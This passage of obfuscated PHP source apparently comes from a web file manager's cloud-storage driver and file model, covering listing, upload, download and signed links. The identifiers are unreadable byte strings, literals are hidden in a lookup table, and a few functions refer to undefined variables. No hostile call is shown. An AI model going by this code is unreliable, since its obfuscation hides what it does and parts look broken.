(!$õ¨…ø¥æ[$Íö©ÚÃ†[1349]]) { return !1; } } $õ¨…ø¥æ = $this->ussRequest($¦ó‘æ‹Û, $Íö©ÚÃ†[1721]); return $õ¨…ø¥æ[$Íö©ÚÃ†[1349]]; } public function rename($íàÅ„, $ÛÃ´×î) { if ($this->isFile($íàÅ„)) { $ÛÃ´×î = get_path_father($íàÅ„) . $ÛÃ´×î; return $this->moveFile($íàÅ„, $ÛÃ´×î); } return $this->renameObject($íàÅ„, $ÛÃ´×î); } public function fileInfo($·Ç“ı£ş, $ÊÑşôõ¢ = false, $«ÅÕ«Ä³ = array()) { $Ë™×‘ƒˆ =& $_SERVER[áäÒ½¯Ç]; $ë®ìîº  = array($Ë™×‘ƒˆ[32] => $this->pathThis($·Ç“ı£ş), $Ë™×‘ƒˆ[87] => $this->getPathOuter($Ë™×‘ƒˆ[8] . $·Ç“ı£ş), $Ë™×‘ƒˆ[33] => $Ë™×‘ƒˆ[241], $Ë™×‘ƒˆ[79] => isset($«ÅÕ«Ä³[$Ë™×‘ƒˆ[79]]) ? $«ÅÕ«Ä³[$Ë™×‘ƒˆ[79]] : 0, $Ë™×‘ƒˆ[167] => $this->ext($·Ç“ı£ş)); if ($ÊÑşôõ¢) { return $ë®ìîº ; } $ë®ìîº [$Ë™×‘ƒˆ[242]] = $ë®ìîº [$Ë™×‘ƒˆ[88]] = 0; $ë®ìîº [$Ë™×‘ƒˆ[243]] = $ë®ìîº [$Ë™×‘ƒˆ[244]] = !0; if (empty($«ÅÕ«Ä³)) { $«ÅÕ«Ä³ = $this->objectMeta($·Ç“ı£ş); if (!$«ÅÕ«Ä³) { return $ë®ìîº ; } } $ë®ìîº [$Ë™×‘ƒˆ[242]] = intval($«ÅÕ«Ä³[$Ë™×‘ƒˆ[1722]]); $ë®ìîº [$Ë™×‘ƒˆ[88]] = intval($«ÅÕ«Ä³[$Ë™×‘ƒˆ[1723]]); $ë®ìîº [$Ë™×‘ƒˆ[79]] = $«ÅÕ«Ä³[$Ë™×‘ƒˆ[79]]; return $ë®ìîº ; } public function folderInfo($ŸÀ¬Ô³¹, $ï ÖÂù“ = false) { $…êş¦åÆ =& $_SERVER[áäÒ½¯Ç]; $„Èì™¾Ê = array($…êş¦åÆ[32] => $this->pathThis($ŸÀ¬Ô³¹), $…êş¦åÆ[87] => $this->getPathOuter($…êş¦åÆ[8] . $ŸÀ¬Ô³¹), $…êş¦åÆ[33] => $…êş¦åÆ[78]); if ($ï ÖÂù“) { return $„Èì™¾Ê; } $„Èì™¾Ê[$…êş¦åÆ[242]] = $„Èì™¾Ê[$…êş¦åÆ[88]] = 0; $„Èì™¾Ê[$…êş¦åÆ[243]] = $„Èì™¾Ê[$…êş¦åÆ[244]] = !0; if (empty($ˆÙŞ—¹Ï)) { $ˆÙŞ—¹Ï = $this->objectMeta($ŸÀ¬Ô³¹); if (!$ˆÙŞ—¹Ï) { return $„Èì™¾Ê; } } $„Èì™¾Ê[$…êş¦åÆ[242]] = intval($ˆÙŞ—¹Ï[$…êş¦åÆ[1722]]); $„Èì™¾Ê[$…êş¦åÆ[88]] = intval($ˆÙŞ—¹Ï[$…êş¦åÆ[1723]]); return $„Èì™¾Ê; } private function listObjs($ÅÆˆµı™, $¾«†Òƒ¬ = 0, $ÄÀãÃõ˜ = 1000) { $€ªÈØ™ï =& $_SERVER[áäÒ½¯Ç]; $ØÒ®¶Å£ = array($€ªÈØ™ï[1724], $€ªÈØ™ï[1725] . $ÄÀãÃõ˜); if ($¾«†Òƒ¬) { $ØÒ®¶Å£[] = $€ªÈØ™ï[1726] . $¾«†Òƒ¬; } $ñ‚±œ›Ÿ = $this->ussRequest($ÅÆˆµı™, $€ªÈØ™ï[1555], !1, $ØÒ®¶Å£); return !$ñ‚±œ›Ÿ[$€ªÈØ™ï[1349]] ? !1 : $ñ‚±œ›Ÿ[$€ªÈØ™ï[1339]]; } private function fileList($È”Ûà”–, &$–‰±ƒ«Ã, &$×ÊéÏª‘, $¬úÔôƒ¢ = false) { $µÈœ»é =& $_SERVER[áäÒ½¯Ç]; $ØíÍ€¾ = $µÈœ»é[12]; $Âèñİæ÷ = 1000; $¾‰ËÜèÓ = rtrim($È”Ûà”–, $µÈœ»é[8]) . $µÈœ»é[8]; while (!0) { check_abort(); $ÊŸİÔÈ = $this->listObjs($È”Ûà”–, $ØíÍ€¾, $Âèñİæ÷); if (!$ÊŸİÔÈ) { return !1; } $ØíÍ€¾ = isset($ÊŸİÔÈ[$µÈœ»é[1727]]) ? $ÊŸİÔÈ[$µÈœ»é[1727]] : $µÈœ»é[12]; $Ğ£ƒ›×¥ = isset($ÊŸİÔÈ[$µÈœ»é[1728]]) ? $ÊŸİÔÈ[$µÈœ»é[1728]] : array(); foreach ($Ğ£ƒ›×¥ as $ØíéÁ¤¨) { $ãîù…Ú = $ØíéÁ¤¨[$µÈœ»é[33]] == $µÈœ»é[78] ? !0 : !1; $‚³‰Ñ‚ = ltrim($¾‰ËÜèÓ . $ØíéÁ¤¨[$µÈœ»é[32]], $µÈœ»é[8]) . ($ãîù…Ú ? $µÈœ»é[8] : $µÈœ»é[12]); $ˆ íÄ = array($µÈœ»é[32] => $‚³‰Ñ‚, $µÈœ»é[33] => $ãîù…Ú ? $µÈœ»é[78] : $µÈœ»é[241], $µÈœ»é[79] => $ØíéÁ¤¨[$µÈœ»é[422]], $µÈœ»é[1723] => $ØíéÁ¤¨[$µÈœ»é[1729]]); $this->cacheMethodInfoSet($‚³‰Ñ‚, $ãîù…Ú, $ˆ íÄ); if ($ãîù…Ú) { $–‰±ƒ«Ã[] = $‚³‰Ñ‚; if ($¬úÔôƒ¢) { $this->fileList($‚³‰Ñ‚, $–‰±ƒ«Ã, $×ÊéÏª‘, $¬úÔôƒ¢); } continue; } $×ÊéÏª‘[] = $ˆ íÄ; } if (count($Ğ£ƒ›×¥) < $Âèñİæ÷) { break; } } $this->cacheMethodInfoSet($È”Ûà”–, !0); } public function listPath($¨Êü®µª, $Ì”Š’Íò = false) { $µÏÈœ” =& $_SERVER[áäÒ½¯Ç]; $“ş‘‹¾ = $ıÃˆë‘Î = array(); $this->fileList($¨Êü®µª, $“ş‘‹¾, $ıÃˆë‘Î); foreach ($“ş‘‹¾ as $õŸÜ‚ù… => $ƒôÛ¼îĞ) { $“ş‘‹¾[$õŸÜ‚ù…] = $this->folderInfo($ƒôÛ¼îĞ, $Ì”Š’Íò); } foreach ($ıÃˆë‘Î as $õŸÜ‚ù… => $ƒôÛ¼îĞ) { $ıÃˆë‘Î[$õŸÜ‚ù…] = $this->fileInfo($ƒôÛ¼îĞ[$µÏÈœ”[32]], $Ì”Š’Íò, $ƒôÛ¼îĞ); } return array($µÏÈœ”[85] => $“ş‘‹¾, $µÏÈœ”[86] => $ıÃˆë‘Î); } public function has($Ë¶Ş¥, $ÉØ«„î = false, $¸ƒş´¨² = true) { $ÚÇ§ò¤´ =& $_SERVER[áäÒ½¯Ç]; $‘ÅÌÍ‘ = $ÚÇ§ò¤´[12]; $˜ˆÕ¿Ùº = 500; $×˜¡„‰ù = 0; $€€ÆØË = 0; $÷îÀòşĞ = rtrim($Ë¶Ş¥, $ÚÇ§ò¤´[8]) . $ÚÇ§ò¤´[8]; while (!0) { check_abort(); $äÁŞú¢Ë = $this->listObjs($Ë¶Ş¥, $‘ÅÌÍ‘, $˜ˆÕ¿Ùº); if (!$äÁŞú¢Ë) { return !1; } $‘ÅÌÍ‘ = isset($äÁŞú¢Ë[$ÚÇ§ò¤´[1727]]) ? $äÁŞú¢Ë[$ÚÇ§ò¤´[1727]] : $ÚÇ§ò¤´[12]; $Ò‹ğ’… = isset($äÁŞú¢Ë[$ÚÇ§ò¤´[1728]]) ? $äÁŞú¢Ë[$ÚÇ§ò¤´[1728]] : array(); if (empty($Ò‹ğ’…)) { break; } $°ı³™Ó = array_filter($Ò‹ğ’…, function ($¼ä¦àÔ¢) { $ËÊ¯ªéé =& $_SERVER[áäÒ½¯Ç]; return $¼ä¦àÔ¢[$ËÊ¯ªéé[33]] == $ËÊ¯ªéé[78]; }); $Ùƒ¦ˆ‹Ú = count($Ò‹ğ’…); $°ı³™Ó = count($°ı³™Ó); $ùÆÊÇ¤ä = $Ùƒ¦ˆ‹Ú - $°ı³™Ó; if ($ÉØ«„î) { $€€ÆØË += $°ı³™Ó; $×˜¡„‰ù += $ùÆÊÇ¤ä; if ($Ùƒ¦ˆ‹Ú < $˜ˆÕ¿Ùº) { break; } continue; } if ($¸ƒş´¨²) { if ($ùÆÊÇ¤ä) { return !0; } } else { if ($°ı³™Ó) { return !0; } } if ($Ùƒ¦ˆ‹Ú < $˜ˆÕ¿Ùº) { break; } } if ($ÉØ«„î) { return array($ÚÇ§ò¤´[250] => $×˜¡„‰ù, $ÚÇ§ò¤´[251] => $€€ÆØË); } return !1; } public function listAll($º¯é£öû) { $Â²À†‚³ =& $_SERVER[áäÒ½¯Ç]; $ùµğƒ°à = $¶Š§ƒàŸ = array(); $this->fileList($º¯é£öû, $ùµğƒ°à, $¶Š§ƒàŸ, !0); $»¸»Ÿº¹ = array_to_keyvalue($¶Š§ƒàŸ, $Â²À†‚³[32]); foreach ($ùµğƒ°à as $¡Ôâô°¥) { if (is_string($¡Ôâô°¥)) { $»¸»Ÿº¹[$¡Ôâô°¥] = array($Â²À†‚³[79] => 0); } } return $this->listAllFiles($º¯é£öû, $»¸»Ÿº¹); } public function canRead($¿“ü‡¡¦) { return $this->exist($¿“ü‡¡¦) ? !0 : !1; } public function canWrite($ıÃ÷•ØÉ) { return $this->exist($ıÃ÷•ØÉ) ? !0 : !1; } public function getContent($ÇÓÕî®®) { return $this->fileSubstr($ÇÓÕî®®, 0, -1); } public function setContent($Ï¥·‰ª, $ıÙşàÈ = '') { $˜Œ³ËÌ¶ =& $_SERVER[áäÒ½¯Ç]; if (!$ıÙşàÈ) { $è–­˜ôš = $this->ussRequest($Ï¥·‰ª, $˜Œ³ËÌ¶[298]); return $è–­˜ôš[$˜Œ³ËÌ¶[1349]]; } $Ó³„™æ = $this->tempFile($this->pathThis($Ï¥·‰ª)); file_put_contents($Ó³„™æ, $ıÙşàÈ); if ($this->upload($Ï¥·‰ª, $Ó³„™æ)) { $this->tempFileRemve($Ó³„™æ); return !0; } return !1; } public function fileSubstr($Å®©ãäµ, $¸ğëËç, $Ïı¾ÑºÉ) { $Æğ’èš· =& $_SERVER[áäÒ½¯Ç]; if (!($†¸©ùî = $this->link($Å®©ãäµ))) { return !1; } $–‹ ô Ÿ = !1; if ($Ïı¾ÑºÉ > 0) { $Üƒ ğèº = $¸ğëËç + $Ïı¾ÑºÉ - 1; $–‹ ô Ÿ = array($Æğ’èš·[1554] . $¸ğëËç . $Æğ’èš·[482] . $Üƒ ğèº); } $”‹ßğùÌ = url_request($†¸©ùî, $Æğ’èš·[1555], !1, $–‹ ô Ÿ); return $”‹ßğùÌ[$Æğ’èš·[852]] ? $”‹ßğùÌ[$Æğ’èš·[1339]] : !1; } public function upload($ÇÜ´«Ÿ, $ùÃúê±ú, $ÔÉù˜Š÷ = false, $ƒºËÒıË = REPEAT_REPLACE) { $òÆùË =& $_SERVER[áäÒ½¯Ç]; if (!$ùÃúê±ú || !@file_exists($ùÃúê±ú)) { return !1; } $—üé£ Ã = IO::size($ùÃúê±ú); if ($—üé£ Ã <= 1024 * 1024 * 200) { $ö³•×›€ = array($òÆùË[1730] . $ùÃúê±ú); $÷Ş¥ùó° = $this->ussRequest($ÇÜ´«Ÿ, $òÆùË[264], $ö³•×›€); return $÷Ş¥ùó°[$òÆùË[1349]] ? $this->getPathOuter($ÇÜ´«Ÿ) : !1; } $»´şÏ– = 1024 * 1024 * 10; $ä™¥·ĞÖ = array($òÆùË[1731], $òÆùË[1732] . $—üé£ Ã, $òÆùË[1733], $òÆùË[1734] . $»´şÏ–); $÷Ş¥ùó° = $this->ussRequest($ÇÜ´«Ÿ, $òÆùË[264], !1, $ä™¥·ĞÖ); if (!$÷Ş¥ùó°[$òÆùË[1349]]) { return !1; } $ø¤ğ©¢¾ = $÷Ş¥ùó°[$òÆùË[1339]]; $ÆŸÜÊç§ = 0; $÷·‹Å¹Ô = $ø¤ğ©¢¾[$òÆùË[1735]]; $åİÍœğ = fopen($ùÃúê±ú, $òÆùË[1615]); if (!$åİÍœğ) { return !1; } do { $áÈÏğáŠ = $ø¤ğ©¢¾[$òÆùË[1736]]; fseek_64($åİÍœğ, $ÆŸÜÊç§); $¹·˜ìîÄ = fread($åİÍœğ, $áÈÏğáŠ); $ÅóÍ¬Ó = 0; do { $ÅóÍ¬Ó++; $ø¤ğ©¢¾ = $this->uploadPart($ÇÜ´«Ÿ, $ø¤ğ©¢¾, $¹·˜ìîÄ); } while (!$ø¤ğ©¢¾ && $ÅóÍ¬Ó < 3); if (!$ø¤ğ©¢¾) { return !1; } $÷·‹Å¹Ô = $ø¤ğ©¢¾[$òÆùË[1735]]; $ÆŸÜÊç§ += $áÈÏğáŠ; } while ($÷·‹Å¹Ô != -1); fclose($åİÍœğ); $ä™¥·ĞÖ = array($òÆùË[1737], $òÆùË[1738] . $ø¤ğ©¢¾[$òÆùË[1739]], $òÆùË[1733]); $÷Ş¥ùó° = $this->ussRequest($ÇÜ´«Ÿ, $òÆùË[264], !1, $ä™¥·ĞÖ); return $÷Ş¥ùó°[$òÆùË[1349]] ? $this->getPathOuter($ŸıÁä õ) : !1; } private function uploadPart($÷ï’×Çî, $à¤ÏÛ­è, &$ÎñöíÏÃ) { $å¹Ú¨Å¦ =& $_SERVER[áäÒ½¯Ç]; $…«ßøåÚ = array($å¹Ú¨Å¦[1740], $å¹Ú¨Å¦[1738] . $à¤ÏÛ­è[$å¹Ú¨Å¦[1739]], $å¹Ú¨Å¦[1741] . $à¤ÏÛ­è[$å¹Ú¨Å¦[1735]], $å¹Ú¨Å¦[144] . $à¤ÏÛ­è[$å¹Ú¨Å¦[1736]]); $©ç›½Ôê = $this->ussRequest($÷ï’×Çî, $å¹Ú¨Å¦[264], $ÎñöíÏÃ, $…«ßøåÚ); return !$©ç›½Ôê[$å¹Ú¨Å¦[1349]] ? $©ç›½Ôê[$å¹Ú¨Å¦[1349]] : $©ç›½Ôê[$å¹Ú¨Å¦[1339]]; } public function uploadFormData($Ê×øòµ¿, $šÛ£»Øã = 3600) { return $this->uploadPolicy($Ê×øòµ¿, $šÛ£»Øã); } public function uploadMultiData($çÙÉ²¯˜, $£¾åõ³‘ = 3600) { $§¥ïÄ¼æ =& $_SERVER[áäÒ½¯Ç]; $½Ü…”Å¼ = (int) $GLOBALS[$§¥ïÄ¼æ[7]][$§¥ïÄ¼æ[79]]; return $this->uploadPolicy($çÙÉ²¯˜, $£¾åõ³‘, $½Ü…”Å¼); } private function uploadPolicy($é¾¸æØÂ, $şá¿à– = 3600, $¾®ê¾ƒï = 0) { $²Éßíñè =& $_SERVER[áäÒ½¯Ç]; $ášİ¹Û = $²Éßíñè[8] . $this->bucket; $¯Ë°´Ï = gmdate($²Éßíñè[1650]); $¹ñªâ‘À = array($²Éßíñè[1742] => $this->bucket, $²Éßíñè[1743] => $é¾¸æØÂ, $²Éßíñè[1744] => time() + $şá¿à–, $²Éßíñè[1745] => $¯Ë°´Ï); if ($¾®ê¾ƒï) { $¹ñªâ‘À[$²Éßíñè[1635]] = $¾®ê¾ƒï; } $ğãôîÚŠ = base64_encode(json_encode($¹ñªâ‘À)); $ºÀñ—ï¬ = base64_encode(hash_hmac($²Éßíñè[1699], "\x50\117\x53\x54\46{$ášİ¹Û}\46{$¯Ë°´Ï}\x26{$ğãôîÚŠ}", md5("{$this->userpass}"), !0)); $ÔŞÎ©‹Ş = array($²Éßíñè[288] => $ğãôîÚŠ, $²Éßíñè[1746] => "\125\120\131\125\116\40{$this->username}\72{$ºÀñ—ï¬}", $²Éßíñè[207] => $this->endpoint . $ášİ¹Û); return $ÔŞÎ©‹Ş; } public function download($·“Õ¸Êö, $º¼ÌÚÍï) { $ß„‡¦À¶ = IO::getPathInner(IO::mkfile($º¼ÌÚÍï)); if (!($ŠÂœ€¾ = $this->link($·“Õ¸Êö))) { return !1; } $à³×•¢ê = 0; $Î‰ïæµ = 1024 * 200; $ç­ß„Ò = fopen($ß„‡¦À¶, $_SERVER[áäÒ½¯Ç][1694]); while (!0) { $ï”ğØÀı = $this->fileSubstr($·“Õ¸Êö, $à³×•¢ê, $Î‰ïæµ); if ($ï”ğØÀı === !1) { return !1; } fwrite($ç­ß„Ò, $ï”ğØÀı); $à³×•¢ê += $Î‰ïæµ; if (strlen($ï”ğØÀı) < $Î‰ïæµ) { break; } } fclose($ç­ß„Ò); return $º¼ÌÚÍï; } public function link($ÜÙ¼Èóø, $øöÅö¬Î = array()) { $½ß¶åÓ¤ =& $_SERVER[áäÒ½¯Ç]; $ÜÙ¼Èóø = trim($ÜÙ¼Èóø, $½ß¶åÓ¤[8]); if (!empty($this->token)) { $ğãåêí€ = strtotime(date($½ß¶åÓ¤[1747])); $œÉ¹­¶š = substr(md5($this->token . $½ß¶åÓ¤[295] . $ğãåêí€ . $½ß¶åÓ¤[1748] . $ÜÙ¼Èóø), 12, 8) . $ğãåêí€; $øöÅö¬Î[] = $½ß¶åÓ¤[1749] . $œÉ¹­¶š; } $¥¼¿²Õ© = !empty($øöÅö¬Î) ? $½ß¶åÓ¤[76] . implode($½ß¶åÓ¤[295], $øöÅö¬Î) : $½ß¶åÓ¤[12]; return $this->getHost() . $½ß¶åÓ¤[8] . $this->pathEncode($ÜÙ¼Èóø) . $¥¼¿²Õ©; } public function fileOut($‡¶²‰Ç¥, $õö¬Ò¤ = false, $ÉïˆÙ‘ = false, $ƒ›Ÿ–ÄÇ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‡¶²‰Ç¥, $õö¬Ò¤, $ÉïˆÙ‘, $ƒ›Ÿ–ÄÇ); } if (!$ÉïˆÙ‘) { $ÉïˆÙ‘ = $this->pathThis($‡¶²‰Ç¥); } $ÙûàÕ± = $õö¬Ò¤ ? array($_SERVER[áäÒ½¯Ç][1750] . rawurlencode($ÉïˆÙ‘)) : array(); $ûÌ»ÜÎ¿ = $this->link($‡¶²‰Ç¥, $ÙûàÕ±); $this->fileOutLink($ûÌ»ÜÎ¿); } public function fileOutServer($È„éÊé‹, $¶ı–Ã«– = false, $¢¤ƒäÍš = false, $–•ÑÇ¢Ö = '') { parent::fileOut($È„éÊé‹, $¶ı–Ã«–, $¢¤ƒäÍš, $–•ÑÇ¢Ö); } public function fileOutImage($€ñ¸µØ­, $öŸä«‹ = 250) { $¾«ùŒŞ™ = $this->link($€ñ¸µØ­ . $_SERVER[áäÒ½¯Ç][1751] . $öŸä«‹); $this->fileOutLink($¾«ùŒŞ™); } public function fileOutImageServer($Ë™¶¦ğ¸, $¡şÂüá = 250) { parent::fileOutImage($Ë™¶¦ğ¸, $¡şÂüá); } public function hashMd5($Ëóùé’æ) { $“¡·…ÌÃ =& $_SERVER[áäÒ½¯Ç]; $™©øÁ = $this->_objectMeta($Ëóùé’æ); return isset($™©øÁ[$“¡·…ÌÃ[256]]) ? $™©øÁ[$“¡·…ÌÃ[256]] : !1; } public function size($Øè€ßÂØ) { $«‰Õ×Ò„ = $this->objectMeta($Øè€ßÂØ); return $«‰Õ×Ò„ ? $«‰Õ×Ò„[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function info($“š·Ä¸ş) { if ($this->isFolder($“š·Ä¸ş)) { return $this->folderInfo($“š·Ä¸ş); } else { if ($this->isFile($“š·Ä¸ş)) { return $this->fileInfo($“š·Ä¸ş); } } return !1; } public function exist($©òÙ¬Ãô) { return $this->isFile($©òÙ¬Ãô) || $this->isFolder($©òÙ¬Ãô); } public function isFile($°ùÛ‘š¬) { return !$this->isFolder($°ùÛ‘š¬) && $this->objectMeta($°ùÛ‘š¬); } public function isFolder($Åßàæ»Û) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][178], $Åßàæ»Û); } protected function objectMeta($¬±÷ĞÕÂ) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][180], $¬±÷ĞÕÂ); } protected function _objectMeta($–÷­Öìå) { $®ñóÕä¯ =& $_SERVER[áäÒ½¯Ç]; if ($–÷­Öìå == $®ñóÕä¯[12] || $–÷­Öìå == $®ñóÕä¯[8]) { return array(); } $Êˆ–œ¼ü = $this->ussRequest($–÷­Öìå, $®ñóÕä¯[1752]); if (!$Êˆ–œ¼ü[$®ñóÕä¯[1349]]) { return null; } $±®ê‘ÌÆ = isset($Êˆ–œ¼ü[$®ñóÕä¯[1339]]) ? $Êˆ–œ¼ü[$®ñóÕä¯[1339]] : array(); if (!isset($±®ê‘ÌÆ[$®ñóÕä¯[1753]])) { return null; } $¼ñ”¸¯¤ = array($®ñóÕä¯[33] => isset($±®ê‘ÌÆ[$®ñóÕä¯[1753]]) ? $±®ê‘ÌÆ[$®ñóÕä¯[1753]] : null, $®ñóÕä¯[79] => isset($±®ê‘ÌÆ[$®ñóÕä¯[1754]]) ? $±®ê‘ÌÆ[$®ñóÕä¯[1754]] : null, $®ñóÕä¯[256] => isset($±®ê‘ÌÆ[$®ñóÕä¯[1755]]) ? $±®ê‘ÌÆ[$®ñóÕä¯[1755]] : null, $®ñóÕä¯[1722] => isset($±®ê‘ÌÆ[$®ñóÕä¯[1756]]) ? $±®ê‘ÌÆ[$®ñóÕä¯[1756]] : null); $¼ñ”¸¯¤[$®ñóÕä¯[1723]] = isset($±®ê‘ÌÆ[$®ñóÕä¯[1757]]) ? strtotime($±®ê‘ÌÆ[$®ñóÕä¯[1757]]) : $¼ñ”¸¯¤[$®ñóÕä¯[1722]]; return $¼ñ”¸¯¤; } protected function _isFolder($éÄâëÅ¨) { $ÀøÒıÆÌ =& $_SERVER[áäÒ½¯Ç]; if ($éÄâëÅ¨ == $ÀøÒıÆÌ[12] || $éÄâëÅ¨ == $ÀøÒıÆÌ[8]) { return !0; } $Æ ÑÒÚ = $this->_objectMeta($éÄâëÅ¨); return isset($Æ ÑÒÚ[$ÀøÒıÆÌ[33]]) && $Æ ÑÒÚ[$ÀøÒıÆÌ[33]] == $ÀøÒıÆÌ[78] ? !0 : !1; } } goto D¬­Ò§ïŸÄ; Fäàñ¶ëĞ™: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\x6c\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\x69\157\x5f\146\151\154\145\x5f\155\x65\164\141", "\x6d\145\164\x61\106\x69\145\154\x64" => "\x66\x69\154\145\x49\x44"); public function fileInfo($Øô”«àş) { $ÆÈÇÕ¼ =& $_SERVER[áäÒ½¯Ç]; static $ó´°Ø = array(); if (!isset($ó´°Ø[$Øô”«àş])) { $ÛÑØà’‡ = $ÆÈÇÕ¼[2182]; $ÔÌø©åã = Model($ÆÈÇÕ¼[565])->field($ÛÑØà’‡)->where(array($ÆÈÇÕ¼[563] => $Øô”«àş))->find(); $ó´°Ø[$Øô”«àş] = $ÔÌø©åã; } return $ó´°Ø[$Øô”«àş]; } public function addFileByContent($‰¡šëøè = '', $ŞÕó·‰, $ïÁ¢€ÓÆ = '') { $Õ×›íõˆ =& $_SERVER[áäÒ½¯Ç]; $ù€ßªîœ = TEMP_PATH . $Õ×›íõˆ[2183]; if (!is_dir($ù€ßªîœ)) { mk_dir($ù€ßªîœ); } $ÛÔÏ³¹‰ = $ù€ßªîœ . $Õ×›íõˆ[2184] . rand_string(16); $¶Å¼ƒœõ = file_put_contents($ÛÔÏ³¹‰, $‰¡šëøè); if ($¶Å¼ƒœõ === !1 || strlen($‰¡šëøè) != $¶Å¼ƒœõ) { return !1; } $ø”œ¥» = $this->addFile($ÛÔÏ³¹‰, $ŞÕó·‰, $ïÁ¢€ÓÆ, !0); if (file_exists($ÛÔÏ³¹‰)) { @unlink($ÛÔÏ³¹‰); } return $ø”œ¥»; } public function createFileName($áÈĞÂø‚, $ÓøÖ˜©», $µ®©®Àš = false, $İ˜ùíò¬ = false) { $©¥Õü»ó =& $_SERVER[áäÒ½¯Ç]; $ÈŞå„Êİ = IO::init($©¥Õü»ó[8]); $Û´§î¸ = $this->_makeFilePath($áÈĞÂø‚, $ÓøÖ˜©», $ÈŞå„Êİ, $µ®©®Àš, $İ˜ùíò¬); $çÉÏƒ­ = $ÈŞå„Êİ->pathFather($Û´§î¸); static $Éí½ÈÏ  = false; $’ŸÚ­à€ = $©¥Õü»ó[2185] . md5($çÉÏƒ­); if (!$Éí½ÈÏ  && !Cache::get($’ŸÚ­à€)) { $Éí½ÈÏ  = !0; $‹èÇÎ¹‡ = IO::mkdir($çÉÏƒ­); if (!IO::exist($‹èÇÎ¹‡ . $©¥Õü»ó[904])) { IO::mkfile($‹èÇÎ¹‡ . $©¥Õü»ó[904]); } Cache::set($’ŸÚ­à€, 1, 3600 * 2); } return $Û´§î¸; } public function _makeFilePath($ÌğÍØÓæ, $Ù“˜Ù, $ µü´ ×, $€œ–†Ÿ = false, $áòÛŠ×ô = false) { $÷ñı‚ß =& $_SERVER[áäÒ½¯Ç]; $’ü¢®¯½ = Model($÷ñı‚ß[875])->get($÷ñı‚ß[2186]); $Ñ£›”Â = $÷ñı‚ß[1374] . $Ù“˜Ù[$÷ñı‚ß[492]] . $÷ñı‚ß[504] . date($÷ñı‚ß[2187]); $½…ÑìÅ = $Ñ£›”Â . rand_string(5) . short_id(100); $ÌğÍØÓæ = str_replace($÷ñı‚ß[8], $÷ñı‚ß[11], KodIO::clear($ÌğÍØÓæ)); $šæ·šú = $ µü´ ×->ext($ÌğÍØÓæ); if (!$ÌğÍØÓæ) { $’ü¢®¯½ = $÷ñı‚ß[881]; } switch ($’ü¢®¯½) { case $÷ñı‚ß[2188]: if ($šæ·šú) { $½…ÑìÅ = $½…ÑìÅ . $÷ñı‚ß[10] . $šæ·šú; } if ($šæ·šú == $÷ñı‚ß[2126]) { $½…ÑìÅ .= $÷ñı‚ß[1343]; } break; case $÷ñı‚ß[2189]: $çşíıƒÍ = Model($÷ñı‚ß[875])->get($÷ñı‚ß[876]); $–™öûÒ– = substr(md5($÷ñı‚ß[877] . $çşíıƒÍ . date($÷ñı‚ß[851])), 0, 8); $Ñ£›”Â = $÷ñı‚ß[1374] . $Ù“˜Ù[$÷ñı‚ß[492]] . $÷ñı‚ß[504] . date($÷ñı‚ß[2190]) . $–™öûÒ– . $÷ñı‚ß[8]; if ($šæ·šú == $÷ñı‚ß[2126]) { $ÌğÍØÓæ .= $÷ñı‚ß[1343]; } $Œá†·”ƒ = $÷ñı‚ß[2191] . $Ñ£›”Â . $ÌğÍØÓæ; CacheLock::lock($Œá†·”ƒ); $½…ÑìÅ = $Ñ£›”Â . $ÌğÍØÓæ; if (IO::exist($Ñ£›”Â . $ÌğÍØÓæ)) { $Á´õÄøÌ = substr($ÌğÍØÓæ, 0, strlen($ÌğÍØÓæ) - strlen($šæ·šú)); $ÉçßçŠ = $áòÛŠ×ô ? substr($áòÛŠ×ô, 0, 5) : ($€œ–†Ÿ ? substr($€œ–†Ÿ, 0, 5) : rand_string(5)); $ÉçßçŠ .= rand_string(3); $½…ÑìÅ = $Ñ£›”Â . $Á´õÄøÌ . $ÉçßçŠ; if ($šæ·šú) { $½…ÑìÅ = $½…ÑìÅ . $÷ñı‚ß[10] . $šæ·šú; } } if (IO::isOsDriver($½…ÑìÅ) && !IO::isUploadServer($½…ÑìÅ)) { if (IO::exist($½…ÑìÅ)) { CacheLock::unlock($Œá†·”ƒ); return $½…ÑìÅ; } $„¦ŞÃä = IO::setContent($½…ÑìÅ, $÷ñı‚ß[12]); if (!$„¦ŞÃä) { show_json($÷ñı‚ß[2192], !1); } } CacheLock::unlock($Œá†·”ƒ); break; case $÷ñı‚ß[881]: break; default: break; } return $½…ÑìÅ; } public function addFileByRemote($ß¹ÊàŸË, $¹’Í‰¡„, $ğÊÁ‘ğ = array()) { $‰ÓˆÚà =& $_SERVER[áäÒ½¯Ç]; if (!IO::isFile($ß¹ÊàŸË)) { return !1; } $ûÂè‡£ = $ğÊÁ‘ğ[$‰ÓˆÚà[568]] ? $ğÊÁ‘ğ[$‰ÓˆÚà[568]] : $‰ÓˆÚà[12]; $¯¢ÇÄ¶Ú = IO::hashMd5($ß¹ÊàŸË, $ûÂè‡£); $‚éÄ·®Å = KodIO::parse($ß¹ÊàŸË); $ÔˆÕœØó = array($‰ÓˆÚà[645] => IO::size($ß¹ÊàŸË), $‰ÓˆÚà[2193] => 1, $‰ÓˆÚà[514] => $¹’Í‰¡„, $‰ÓˆÚà[918] => $‚éÄ·®Å[$‰ÓˆÚà[492]], $‰ÓˆÚà[515] => $ß¹ÊàŸË, $‰ÓˆÚà[2194] => $ğÊÁ‘ğ[$‰ÓˆÚà[700]] ? $ğÊÁ‘ğ[$‰ÓˆÚà[700]] : IO::hashSimple($ß¹ÊàŸË), $‰ÓˆÚà[2195] => $¯¢ÇÄ¶Ú ? $¯¢ÇÄ¶Ú : $ûÂè‡£); if ($’‘ğ„¶ã = $this->addFileCheckExist($ÔˆÕœØó[$‰ÓˆÚà[700]], $ÔˆÕœØó[$‰ÓˆÚà[568]], $ÔˆÕœØó[$‰ÓˆÚà[79]])) { return $’‘ğ„¶ã; } return $this->addFileData($ÔˆÕœØó); } private function addFileData($çÁŒÒ½·) { $Ö±¡¬ª =& $_SERVER[áäÒ½¯Ç]; if (!$çÁŒÒ½·) { return !1; } if (!IO::isFile($çÁŒÒ½·[$Ö±¡¬ª[87]])) { return !1; } $çÁŒÒ½·[$Ö±¡¬ª[79]] = intval($çÁŒÒ½·[$Ö±¡¬ª[79]]); if (!$çÁŒÒ½·[$Ö±¡¬ª[79]] && 